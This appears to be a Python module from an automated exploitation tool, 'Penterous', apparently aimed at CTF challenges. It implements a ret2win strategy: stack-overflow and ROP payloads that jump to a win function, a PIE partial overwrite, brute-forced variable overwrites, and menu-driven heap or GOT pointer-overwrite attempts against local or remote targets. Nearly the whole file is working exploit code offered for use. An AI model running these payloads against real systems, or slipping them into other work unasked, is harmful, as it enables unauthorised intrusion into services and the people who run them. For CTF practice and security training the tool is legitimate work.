"""
Penterous — ret2win strategy: jump to hidden win/flag function.

Enhanced with interactive menu binary support:
  - Detects menu-driven binaries (scanf %d for choice, then payload input)
  - Tries multi-step interaction: select write option → send payload → trigger
  - Tries multiple payload shapes (p32, p64, with/without padding) for heap/GOT overwrites
  - Falls back to classic single-payload injection for crash-based binaries
"""
import struct
import time
from typing import Optional
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error
from utils.pwntools_wrap import PWNTOOLS_AVAILABLE


# ── Menu interaction helpers ──────────────────────────────────────────────────

_WRITE_TRIGGERS  = [b'write', b'buffer', b'input', b'data', b'store',
                    b'send', b'enter', b'give', b'type', b'what']
_CHOICE_TRIGGERS = [b'choice', b'option', b'select', b'menu', b'pick']
_FLAG_TRIGGERS   = [b'flag', b'print flag', b'get flag', b'show flag',
                    b'cat flag', b'read flag']
_TRIGGER_TRIGGERS = [b'print x', b'call', b'trigger', b'run', b'execute',
                     b'invoke', b'check', b'test', b'view']

def _looks_like_menu(output: bytes) -> bool:
    lo = output.lower()
    # Must have a menu keyword
    if not any(t in lo for t in _CHOICE_TRIGGERS):
        return False
    # And must have at least one numbered option line (e.g. "1.", "2.", "1)")
    import re
    if re.search(rb'\b[1-9][.):]', output):
        return True
    return False

def _find_write_option(menu_text: bytes) -> Optional[bytes]:
    lo = menu_text.lower()
    lines = lo.split(b'\n')
    for line in lines:
        if any(t in line for t in _WRITE_TRIGGERS):
            stripped = line.strip()
            for tok in stripped.split():
                tok = tok.strip(b'.):- ')
                if tok.isdigit():
                    return tok
    return None

def _find_flag_option(menu_text: bytes) -> Optional[bytes]:
    lo = menu_text.lower()
    lines = lo.split(b'\n')
    for line in lines:
        if any(t in line for t in _FLAG_TRIGGERS):
            stripped = line.strip()
            for tok in stripped.split():
                tok = tok.strip(b'.):- ')
                if tok.isdigit():
                    return tok
    return None

def _find_trigger_option(menu_text: bytes) -> Optional[bytes]:
    """Find option that calls/triggers the function pointer (e.g. 'Print x', 'Call function')."""
    lo = menu_text.lower()
    lines = lo.split(b'\n')
    for line in lines:
        if any(t in line for t in _TRIGGER_TRIGGERS):
            stripped = line.strip()
            for tok in stripped.split():
                tok = tok.strip(b'.):- ')
                if tok.isdigit():
                    return tok
    return None


class Ret2WinStrategy(ExploitStrategy):
    """
    Simplest exploit: binary has a win()/flag() function, PIE is off.

    Enhanced:
    - Handles interactive menu binaries (write-to-heap → call pointer)
    - Tries multiple payload shapes: p32, p32 with padding, p64, full ROP
    - Falls back to classic single-payload injection
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'ret2win'

        # ── Variable overwrite mode: no win function but "You win!" string ──
        _WIN_STR_KW = ['you win', 'you won', 'winner', 'congratulations', 'congrats',
                       'correct!', 'access granted']
        _interesting = getattr(self.binary, 'interesting_strings', [])
        _has_win_str = any(kw in s.lower() for s in _interesting for kw in _WIN_STR_KW)
        if not self.binary.win_functions and _has_win_str:
            info("Variable overwrite challenge detected ('You win!' pattern)")
            output = self._exec_var_overwrite(mode, host, port)
            flag = self.hunter.hunt(output) if output else None
            return self._make_result(
                success_=flag is not None,
                flag=flag, strategy=strategy,
                payload=b'var_overwrite', output=output or b'',
                start_time=start, mode=mode, host=host or '', port=port or 0,
                error_msg='' if flag else 'Variable overwrite failed',
            )

        if not self.binary.win_functions:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "No win function found", mode=mode)

        name, win_addr = self.binary.win_functions[0]
        info(f"Win function: {name}() at 0x{win_addr:x}")

        win_args = self.binary.win_args.get(name, []) \
            if hasattr(self.binary, 'win_args') else []
        if win_args:
            info(f"Detected win() arguments: {', '.join(f'0x{a:x}' for a in win_args)}")

        pie = self.binary.protections.get('PIE', False)
        if pie:
            warning("PIE enabled — attempting partial overwrite (last 2 bytes)")
            rop_payload = b'A' * self.offset + (win_addr & 0xFFFF).to_bytes(2, 'little')
        else:
            rop_payload = self.rop.build_ret2win(self.offset, win_addr, win_args=win_args)

        bits = self.binary.bits
        p_func = f"p{'64' if bits == 64 else '32'}"
        ret_gadget_addr = self.rop._find_ret_gadget() if (bits == 64 and not pie) else 0
        if ret_gadget_addr:
            info(f"Payload (ROP): A*{self.offset} + p64(0x{ret_gadget_addr:x}) [ret] + p64(0x{win_addr:x})")
        else:
            info(f"Payload (ROP): A*{self.offset} + {p_func}(0x{win_addr:x})")
        info(f"Payload size: {len(rop_payload)} bytes")

        # ── Choose execution path ─────────────────────────────────────────────
        if mode == 'local':
            output = self._exec_local_smart(rop_payload, win_addr)
        else:
            if not PWNTOOLS_AVAILABLE:
                return self._make_result(False, None, strategy, rop_payload, b'', start,
                                         "pwntools required for remote mode", mode=mode)
            tube = self._get_tube(host, port)
            if tube is None:
                return self._make_result(False, None, strategy, rop_payload, b'', start,
                                         "Failed to connect to remote", mode=mode)
            output = self._exec_remote_smart(tube, rop_payload, win_addr)

        # ── Clean and hunt flag ───────────────────────────────────────────────
        clean_lines = []
        for line in output.splitlines(keepends=True):
            stripped = line.strip(b'\x00\n\r ')
            if stripped and all(b == ord('A') for b in stripped):
                continue
            clean_lines.append(line)
        clean_output = b''.join(clean_lines)

        flag = self.hunter.hunt(clean_output)
        if not flag:
            flag = self.hunter.hunt(output)

        if not flag and output:
            decoded = output.decode('utf-8', errors='replace').strip()
            if decoded:
                info(f"Raw output: {decoded[:300]}")

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=rop_payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
            error_msg="" if flag else "Flag pattern not found in output (win() may need flag.txt to exist)",
        )

    # ── Payload candidates for menu mode ─────────────────────────────────────

    def _menu_payload_candidates(self, rop_payload: bytes, win_addr: int):
        """
        Yield candidate payloads for menu interaction (heap/GOT pointer overwrite).
        We try every known win function address × every common padding size.
        Ordered by likelihood:
          1. p32(addr) for each win function — direct 4-byte heap overwrite
          2. A*N + p32(addr) with various paddings
          3. p64 variants
          4. The original ROP payload
        """
        # Collect all win addresses (all win functions, most specific first)
        all_win_addrs = [win_addr]
        if hasattr(self.binary, 'win_functions') and self.binary.win_functions:
            for _, a in self.binary.win_functions:
                if a not in all_win_addrs:
                    all_win_addrs.append(a)

        for addr in all_win_addrs:
            win32 = struct.pack('<I', addr & 0xFFFFFFFF)
            win64 = struct.pack('<Q', addr)

            # 1. Direct 4-byte (most common picoCTF heap write pattern)
            yield win32

            # 2. With padding — try common heap distances
            for pad in [20, 32, 16, 24, 8, 40, 48, 12, 28, 36, self.offset]:
                if 0 < pad <= 128:
                    yield b'A' * pad + win32

            # 3. 8-byte pointer overwrite
            yield win64
            for pad in [32, 16, 24]:
                yield b'A' * pad + win64

        # 4. Full ROP (stack smash)
        yield rop_payload

    # ── Variable overwrite execution ─────────────────────────────────────────

    def _exec_var_overwrite(self, mode: str, host: str, port: int) -> bytes:
        """
        Variable overwrite exploit: send A*offset + p32/p64(magic_value).
        Tries common CTF magic values at various offsets.
        The offset comes from self.offset (fuzzer found it via crash).
        """
        if not PWNTOOLS_AVAILABLE:
            return b''

        import pwn, struct as _struct, os as _os, resource as _res

        pwn.context.log_level = 'error'
        bits = self.binary.bits

        def _no_core():
            try:
                _res.setrlimit(_res.RLIMIT_CORE, (0, 0))
            except Exception:
                pass

        # Common CTF magic values (decimal and hex)
        magic_values = [65, 0x41, 0, 1, 0xdeadbeef, 0xcafebabe,
                        0x1337, 0x1234, 100, 42, 0xff, 0xbabe]

        # Offsets to try (self.offset first, then common ones)
        offsets = [self.offset] + [o for o in [24, 32, 16, 8, 40, 48, 20, 12, 28, 36]
                                   if o != self.offset]

        cwd = _os.path.dirname(_os.path.abspath(self.binary.path))

        def _make_tube():
            if mode == 'remote' and host and port:
                return pwn.remote(host, port)
            return pwn.process(self.binary.path, cwd=cwd,
                               stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT,
                               preexec_fn=_no_core)

        for offset in offsets:
            for val in magic_values:
                try:
                    # Pack as 32-bit (most common for var overwrite CTFs)
                    packed = _struct.pack('<I', val & 0xFFFFFFFF)
                    payload = b'A' * offset + packed
                    p = _make_tube()
                    try:
                        # Drain prompt
                        try:
                            p.recvrepeat(0.3)
                        except Exception:
                            pass
                        p.sendline(payload)
                        out = b''
                        try:
                            out = p.recvall(timeout=2)
                        except Exception:
                            try:
                                out = p.recv(timeout=2)
                            except Exception:
                                pass
                        flag = self.hunter.hunt(out)
                        if flag or b'You win' in out or b'you win' in out.lower():
                            info(f"Var overwrite: offset={offset} value={val} ({val:#x})")
                            return out
                    finally:
                        try:
                            p.close()
                        except Exception:
                            pass
                except Exception:
                    continue
        return b''

    # ── Smart local execution ─────────────────────────────────────────────────

    def _is_menu_binary(self) -> tuple:
        """
        Spawn the binary once, read its banner, check for menu.
        Returns (is_menu, banner, write_opt, flag_opt, trigger_opt).
        Fast probe — single process, 0.5s timeout.
        """
        if not PWNTOOLS_AVAILABLE:
            return False, b'', b'2', b'4', b'4'
        try:
            import pwn, os, resource

            def _no_core():
                try:
                    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
                except Exception:
                    pass
                try:
                    with open('/proc/self/coredump_filter', 'w') as f:
                        f.write('0\n')
                except Exception:
                    pass

            binary_path = self.binary.path
            cwd = os.path.dirname(os.path.abspath(binary_path))
            _ensure_flag_txt(cwd)
            pwn.context.log_level = 'error'
            p = pwn.process(binary_path, cwd=cwd,
                            stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT,
                            preexec_fn=_no_core)
            try:
                banner = p.recvrepeat(0.2)
            except Exception:
                banner = b''
            finally:
                try:
                    p.close()
                except Exception:
                    pass

            if not _looks_like_menu(banner):
                return False, banner, b'2', b'4', b'4'

            write_opt   = _find_write_option(banner)   or b'2'
            flag_opt    = _find_flag_option(banner)    or b'4'
            trigger_opt = _find_trigger_option(banner) or flag_opt
            return True, banner, write_opt, flag_opt, trigger_opt

        except Exception:
            return False, b'', b'2', b'4', b'4'

    def _exec_local_smart(self, rop_payload: bytes, win_addr: int) -> bytes:
        """
        Probe the binary once to detect menu vs direct input.
        - Menu binary  → try heap/pointer payloads via menu interaction
        - Direct binary → go straight to classic single-payload injection
        """
        if not PWNTOOLS_AVAILABLE:
            return self._exec_local_subprocess(rop_payload)

        is_menu, banner, write_opt, flag_opt, trigger_opt = self._is_menu_binary()

        if not is_menu:
            # No menu detected — skip all menu attempts, go direct
            info("No menu detected — using classic single-payload injection")
            return self._exec_local_pwntools(rop_payload)

        # Menu binary — try pointer/heap overwrite payloads
        info(f"Menu detected — write={write_opt} flag={flag_opt}")
        # ── Check menu payload cache ─────────────────────────────────────
        import hashlib, json as _json, os as _os
        _cache_dir = _os.path.expanduser("~/.cache/penterous")
        _os.makedirs(_cache_dir, exist_ok=True)
        try:
            with open(self.binary.path, 'rb') as _f:
                _sha = hashlib.sha256(_f.read()).hexdigest()[:16]
            _mcache = _os.path.join(_cache_dir, f"{_os.path.basename(self.binary.path)}_{_sha}_menu.json")
        except Exception:
            _mcache = None

        # Try cached winning payload first
        if _mcache and _os.path.exists(_mcache):
            try:
                _cached = _json.load(open(_mcache))
                _cached_payload = bytes.fromhex(_cached['payload_hex'])
                _cached_write = _cached['write_opt'].encode()
                _cached_flag  = _cached['flag_opt'].encode()
                info(f"[menu] Using cached payload (len={len(_cached_payload)})")
                output = self._exec_menu_local(_cached_payload, win_addr,
                                               _cached_write, _cached_flag, _cached_flag)
                if output and self.hunter.hunt(output):
                    return output
            except Exception:
                pass

        last_output = b''
        for candidate in self._menu_payload_candidates(rop_payload, win_addr):
            output = self._exec_menu_local(candidate, win_addr,
                                           write_opt, flag_opt, trigger_opt)
            last_output = output
            if output and self.hunter.hunt(output):
                info(f"[menu] Success with payload: {candidate[:20]!r}...")
                # Save winning payload to cache
                if _mcache:
                    try:
                        _json.dump({
                            'payload_hex': candidate.hex(),
                            'write_opt': write_opt.decode(),
                            'flag_opt':  flag_opt.decode(),
                        }, open(_mcache, 'w'))
                    except Exception:
                        pass
                return output

        # Menu attempts exhausted without flag
        warning("Menu payloads exhausted — falling back to classic injection")
        classic = self._exec_local_pwntools(rop_payload)
        return classic if classic else last_output

    def _exec_menu_local(self, payload: bytes, win_addr: int,
                          write_opt: bytes = b'2', flag_opt: bytes = b'4',
                          trigger_opt: bytes = None) -> bytes:
        """
        Spawn the binary, navigate the menu, inject payload, trigger win function.
        Menu options are passed in — no banner re-read needed.
        """
        if trigger_opt is None:
            trigger_opt = flag_opt
        try:
            import pwn, os, resource

            pwn.context.log_level = 'error'
            binary_path = self.binary.path

            def _no_core():
                try:
                    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
                except Exception:
                    pass
                try:
                    with open('/proc/self/coredump_filter', 'w') as f:
                        f.write('0\n')
                except Exception:
                    pass

            cwd = os.path.dirname(os.path.abspath(binary_path))
            _ensure_flag_txt(cwd)
            p = pwn.process(binary_path, cwd=cwd,
                            stdin=pwn.PIPE, stdout=pwn.PIPE, stderr=pwn.STDOUT,
                            preexec_fn=_no_core)

            collected = b''
            try:
                # ── Read banner (fast, already know it's a menu) ──────────────
                try:
                    banner = p.recvrepeat(0.2)
                except Exception:
                    banner = b''
                collected += banner

                info(f"[menu] write={write_opt} flag={flag_opt}  payload={payload[:16]!r}...")

                # ── Step 1: select write option ───────────────────────────────
                p.sendline(write_opt)
                prompt = p.recvrepeat(0.15)
                collected += prompt

                # ── Step 2: send payload ──────────────────────────────────────
                p.sendline(payload)
                after_payload = p.recvrepeat(0.15)
                collected += after_payload

                # ── Step 3: send flag option (which may call check_win → *(int*)x) ──
                # NOTE: We prefer flag_opt directly because many CTF binaries
                # have a "Print Flag" option that internally calls the function
                # pointer. Sending a separate trigger first may crash with the
                # old/unmodified pointer.
                p.sendline(flag_opt)
                try:
                    rest = p.recvall(timeout=3)
                except Exception:
                    try:
                        rest = p.recv(timeout=3)
                    except Exception:
                        rest = b''
                collected += rest

            except Exception as inner:
                warning(f"[menu] Interaction error: {inner}")
                try:
                    collected += p.recv(timeout=2)
                except Exception:
                    pass
            finally:
                try:
                    p.close()
                except Exception:
                    pass

            return collected

        except Exception as e:
            error(f"[menu] Process error: {e}")
            return b''

    # ── Smart remote execution ────────────────────────────────────────────────

    def _exec_remote_smart(self, tube, rop_payload: bytes, win_addr: int) -> bytes:
        """
        Interactive menu exploit for remote targets.
        Tries multiple payload shapes.
        """
        import struct
        win32 = struct.pack('<I', win_addr & 0xFFFFFFFF)

        candidates = list(self._menu_payload_candidates(rop_payload, win_addr))
        # For remote, we can only try one shot — use the most likely payload
        payload = candidates[0]  # p32(win_addr) — best bet for heap-write CTFs

        collected = b''
        try:
            # Read banner / initial menu
            try:
                banner = tube.recvrepeat(1.5)
            except Exception:
                try:
                    banner = tube.recv(timeout=3)
                except Exception:
                    banner = b''
            collected += banner
            info(f"[remote menu] Banner: {banner[:100]!r}")

            if _looks_like_menu(banner):
                write_opt   = _find_write_option(banner)   or b'2'
                flag_opt    = _find_flag_option(banner)    or b'4'
                trigger_opt = _find_trigger_option(banner) or flag_opt
                info(f"[remote] write={write_opt} trigger={trigger_opt} flag={flag_opt}")

                # Step 1
                tube.sendline(write_opt)
                try:
                    prompt = tube.recvrepeat(1.5)
                except Exception:
                    prompt = b''
                collected += prompt

                # Step 2: payload
                tube.sendline(payload)
                try:
                    after = tube.recvrepeat(1.5)
                except Exception:
                    after = b''
                collected += after

                # Step 3: trigger
                if trigger_opt != flag_opt:
                    tube.sendline(trigger_opt)
                    try:
                        trig = tube.recvrepeat(1.5)
                    except Exception:
                        trig = b''
                    collected += trig

                # Step 4: flag option
                tube.sendline(flag_opt)
            else:
                # No menu — classic single payload
                tube.sendline(rop_payload)

            # Collect remainder
            try:
                rest = tube.recvall(timeout=self.timeout)
            except Exception:
                try:
                    rest = tube.recv(timeout=5)
                except Exception:
                    rest = b''
            collected += rest

        except Exception as e:
            error(f"[remote menu] Error: {e}")
        finally:
            try:
                tube.close()
            except Exception:
                pass

        return collected
